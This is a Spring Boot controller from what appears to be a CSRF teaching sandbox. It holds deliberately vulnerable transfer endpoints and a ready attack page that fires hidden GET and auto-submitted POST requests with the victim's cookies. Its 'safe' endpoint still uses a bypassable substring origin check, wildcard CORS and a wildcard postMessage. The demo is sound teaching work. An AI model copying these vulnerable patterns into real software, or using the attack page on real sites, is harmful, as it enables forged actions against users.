package com.tutornet.tutor_net.controller.sandbox;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.*;

import jakarta.servlet.http.HttpServletRequest;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * Chương 8 — CSRF (CROSS-SITE REQUEST FORGERY)
 *
 * TC-CH8-01  GET  /api/demo/csrf/transfer/vulnerable-get    GET-based CSRF (state change via GET)
 * TC-CH8-02  POST /api/demo/csrf/transfer/vulnerable-post   POST-based CSRF (không validate Origin/Token)
 * TC-CH8-03  POST /api/demo/csrf/transfer/safe              Fix: CSRF token validation
 * TC-CH8-04  GET  /api/demo/csrf/token                      Lấy CSRF token (cho client)
 * TC-CH8-05  GET  /api/demo/csrf/attack-page               HTML page giả lập CSRF attack
 */
@Slf4j
@RestController
@RequestMapping("/api/v1/demo/csrf")
@CrossOrigin(origins = "*", allowedHeaders = "*")
@RequiredArgsConstructor
public class CsrfController {

    private final JdbcTemplate jdbc;

    // CSRF token store: sessionId -> csrfToken
    private final ConcurrentHashMap<String, String> csrfTokenStore = new ConcurrentHashMap<>();

    // Transfer log để demo
    private final List<Map<String, Object>> transferLog = new ArrayList<>();

    // ----------------------------------------------------------------
    //  TC-CH8-01 · GET-based CSRF (VULNERABLE)
    //
    //  Vấn đề: Dùng GET để thực hiện state-changing action
    //  Attacker nhúng: <img src="http://tutornet.com/api/demo/csrf/transfer/vulnerable-get?to=attacker&amount=1000000">
    //  Khi victim load trang của attacker → trình duyệt tự gửi GET request kèm cookie
    // ----------------------------------------------------------------
    @GetMapping("/transfer/vulnerable-get")
    public ResponseEntity<?> vulnerableGetTransfer(
            @RequestParam(defaultValue = "attacker@evil.com") String to,
            @RequestParam(defaultValue = "1000000") String amount,
            HttpServletRequest request) {

        // Không kiểm tra gì cả — GET request thực hiện transfer
        String fromUser = "victim@tutornet.com"; // assume logged in

        log.warn("[DEMO-CH8] GET-based CSRF TRIGGERED: transfer {} from {} to {}",
                amount, fromUser, to);

        Map<String, Object> entry = Map.of(
                "type",       "GET-CSRF",
                "from",       fromUser,
                "to",         to,
                "amount",     amount,
                "origin",     request.getHeader("Origin") != null ? request.getHeader("Origin") : "unknown",
                "referer",    request.getHeader("Referer") != null ? request.getHeader("Referer") : "unknown",
                "timestamp",  new Date().toString(),
                "result",     " TRANSFER EXECUTED (CSRF attack succeeded!)"
        );
        transferLog.add(entry);

        return ResponseEntity.ok(Map.of(
                "endpoint",    "GET-CSRF VULNERABLE",
                "transferred", true,
                "from",        fromUser,
                "to",          to,
                "amount",      amount,
                "warning",     "State change via GET — attackable by <img>, <link>, <script src=> tags",
                "attackVector","<img src=\"/api/demo/csrf/transfer/vulnerable-get?to=attacker@evil.com&amount=1000000\">",
                "transferLog", entry
        ));
    }

    // ----------------------------------------------------------------
    //  TC-CH8-02 · POST-based CSRF (VULNERABLE)
    //
    //  Vấn đề: POST nhưng không validate CSRF token và không check Origin
    //  Attacker tạo form tự submit trên trang evil.com
    // ----------------------------------------------------------------
    @PostMapping("/transfer/vulnerable-post")
    public ResponseEntity<?> vulnerablePostTransfer(
            @RequestBody(required = false) Map<String, String> body,
            HttpServletRequest request) {

        if (body == null) body = Map.of();
        String to     = body.getOrDefault("to",     "attacker@evil.com");
        String amount = body.getOrDefault("amount", "500000");

        // ❌ Không kiểm tra CSRF token
        // ❌ Không kiểm tra Origin header
        // ❌ Không kiểm tra Referer header
        String origin  = request.getHeader("Origin");
        String referer = request.getHeader("Referer");

        log.warn("[DEMO-CH8] POST-CSRF TRIGGERED: to={}, amount={}, origin={}", to, amount, origin);

        Map<String, Object> entry = Map.of(
                "type",      "POST-CSRF",
                "from",      "victim@tutornet.com",
                "to",        to,
                "amount",    amount,
                "origin",    origin != null ? origin : "null",
                "referer",   referer != null ? referer : "null",
                "timestamp", new Date().toString(),
                "result",    "✅ TRANSFER EXECUTED (CSRF attack succeeded!)"
        );
        transferLog.add(entry);

        return ResponseEntity.ok(Map.of(
                "endpoint",    "POST-CSRF VULNERABLE",
                "transferred", true,
                "to",          to,
                "amount",      amount,
                "csrfToken",   "NOT CHECKED",
                "originCheck", "NOT CHECKED",
                "transferLog", entry
        ));
    }

    // ----------------------------------------------------------------
    //  TC-CH8-03 · SAFE — CSRF token validation + Origin check
    // ----------------------------------------------------------------
    @PostMapping("/transfer/safe")
    public ResponseEntity<?> safeTransfer(
            @RequestBody(required = false) Map<String, String> body,
            @RequestHeader(value = "X-CSRF-Token", required = false) String csrfHeader,
            HttpServletRequest request) {

        if (body == null) body = Map.of();
        String to         = body.getOrDefault("to", "");
        String amount     = body.getOrDefault("amount", "0");
        String csrfToken  = body.getOrDefault("csrfToken", csrfHeader != null ? csrfHeader : "");
        String sessionId  = body.getOrDefault("sessionId", "demo-session");

        // ✅ Validate Origin / Referer
        String origin = request.getHeader("Origin");
        if (origin != null && !isAllowedOrigin(origin)) {
            log.warn("[DEMO-CH8] CSRF blocked — invalid origin: {}", origin);
            return ResponseEntity.status(403).body(Map.of(
                    "endpoint", "SAFE TRANSFER",
                    "blocked",  true,
                    "reason",   "Origin not allowed: " + origin
            ));
        }

        // ✅ Validate CSRF token
        String expectedToken = csrfTokenStore.get(sessionId);
        if (expectedToken == null || !expectedToken.equals(csrfToken)) {
            log.warn("[DEMO-CH8] CSRF blocked — invalid token. expected={}, got={}",
                    expectedToken, csrfToken);
            return ResponseEntity.status(403).body(Map.of(
                    "endpoint",       "SAFE TRANSFER",
                    "blocked",        true,
                    "reason",         "CSRF token invalid or missing",
                    "providedToken",  csrfToken,
                    "expectedToken",  expectedToken != null ? expectedToken.substring(0,8)+"..." : "null"
            ));
        }

        // ✅ Token hợp lệ — thực hiện transfer
        // ✅ Rotate CSRF token sau mỗi request (double submit)
        csrfTokenStore.put(sessionId, generateCsrfToken());

        return ResponseEntity.ok(Map.of(
                "endpoint",    "SAFE TRANSFER",
                "transferred", true,
                "to",          to,
                "amount",      amount,
                "csrfValid",   true,
                "originValid", true
        ));
    }

    // ----------------------------------------------------------------
    //  TC-CH8-04 · Lấy CSRF token
    // ----------------------------------------------------------------
    @GetMapping("/token")
    public ResponseEntity<?> getCsrfToken(
            @RequestParam(defaultValue = "demo-session") String sessionId) {

        String token = csrfTokenStore.computeIfAbsent(sessionId, k -> generateCsrfToken());

        return ResponseEntity.ok(Map.of(
                "csrfToken", token,
                "sessionId", sessionId,
                "usage",     "Gửi trong header 'X-CSRF-Token' hoặc body 'csrfToken'"
        ));
    }

    // ----------------------------------------------------------------
    //  TC-CH8-05 · Attack page HTML (giảng viên mở để demo)
    // ----------------------------------------------------------------
    @GetMapping(value = "/attack-page", produces = "text/html")
    public String attackPage(@RequestParam(defaultValue = "http://localhost:8080") String targetBase) {
        return """
                <!DOCTYPE html>
                <html>
                <head><title>CSRF Attack Demo — Evil Site</title></head>
                <body style="font-family:sans-serif;padding:2rem">
                <h2 style="color:red">⚠ Evil Attacker Page (CSRF Demo)</h2>
                <p>Khi victim load trang này, 2 CSRF attacks tự động kích hoạt:</p>
                
                <h3>1. GET-based CSRF (ẩn trong img tag)</h3>
                <img src="%s/api/demo/csrf/transfer/vulnerable-get?to=attacker@evil.com&amount=1000000"
                     onerror="document.getElementById('get-result').textContent='GET request đã được gửi!'"
                     onload="document.getElementById('get-result').textContent='GET request đã được gửi!'"
                     style="display:none">
                <p id="get-result" style="color:orange">Đang gửi GET CSRF...</p>
                
                <h3>2. POST-based CSRF (auto-submit form)</h3>
                <form id="csrf-form" action="%s/api/demo/csrf/transfer/vulnerable-post"
                      method="POST" style="display:none">
                    <input type="hidden" name="to"     value="attacker@evil.com">
                    <input type="hidden" name="amount" value="500000">
                </form>
                <p id="post-result" style="color:orange">POST CSRF đang được gửi...</p>
                
                <script>
                // Auto submit POST form
                setTimeout(function() {
                    fetch('%s/api/demo/csrf/transfer/vulnerable-post', {
                        method: 'POST',
                        headers: {'Content-Type':'application/json'},
                        credentials: 'include',
                        body: JSON.stringify({to:'attacker@evil.com', amount:'500000'})
                    }).then(r => r.json()).then(data => {
                        document.getElementById('post-result').textContent =
                            'POST CSRF executed! Result: ' + JSON.stringify(data.transferred);
                        document.getElementById('post-result').style.color = 'red';
                    }).catch(e => {
                        document.getElementById('post-result').textContent = 'Blocked (CORS/CSRF protection active): ' + e;
                        document.getElementById('post-result').style.color = 'green';
                    });
                }, 500);
                </script>
                
                <hr>
                <p><a href="%s/api/demo/csrf/transfer/vulnerable-get?to=attacker@evil.com&amount=999">
                Xem transfer log</a></p>
                </body></html>
                """.formatted(targetBase, targetBase, targetBase, targetBase);
    }

    // ----------------------------------------------------------------
    //  Transfer log viewer
    // ----------------------------------------------------------------
    @GetMapping("/transfers")
    public ResponseEntity<?> getTransfers() {
        return ResponseEntity.ok(Map.of(
                "transfers", transferLog,
                "total",     transferLog.size()
        ));
    }

    @DeleteMapping("/transfers")
    public ResponseEntity<?> clearTransfers() {
        transferLog.clear();
        return ResponseEntity.ok(Map.of("message", "Transfer log cleared."));
    }

    @GetMapping("/profile/vulnerable-update-name")
    public ResponseEntity<?> vulnerableUpdateName(
            @RequestParam(defaultValue = "Hacker Bi An") String fullName) {
        
        log.warn("[DEMO-CH8] GET-based CSRF Profile Name Update: {}", fullName);
        
        try {
            jdbc.update("UPDATE users SET full_name = ? WHERE email = ?", fullName, "johnsnow9813@gmail.com");
        } catch (Exception e) {
            log.error("Failed to update display name via GET CSRF", e);
        }

        Map<String, Object> entry = Map.of(
                "type",       "GET-CSRF-NAME",
                "action",     "Cập nhật họ tên thành: " + fullName,
                "to",         "johnsnow9813@gmail.com",
                "amount",     "0",
                "timestamp",  new Date().toString(),
                "result",     "✅ DISPLAY NAME UPDATED TO: " + fullName
        );
        transferLog.add(entry);

        // Trả về HTML chứa script gửi message lên parent window để cập nhật session client lập tức
        String htmlResponse = """
                <html><body>
                <script>
                // Gửi message thông báo cho Parent Window update lại auth session
                if (window.parent) {
                    window.parent.postMessage('auth-session-update', '*');
                }
                </script>
                </body></html>
                """;

        return ResponseEntity.ok()
                .header("Content-Type", "text/html; charset=utf-8")
                .body(htmlResponse);
    }

    // ----------------------------------------------------------------
    //  Helpers
    // ----------------------------------------------------------------

    private String generateCsrfToken() {
        SecureRandom sr = new SecureRandom();
        byte[] bytes = new byte[32];
        sr.nextBytes(bytes);
        return HexFormat.of().formatHex(bytes);
    }

    private boolean isAllowedOrigin(String origin) {
        return origin.contains("localhost:8080") || origin.contains("tutornet.com");
    }
}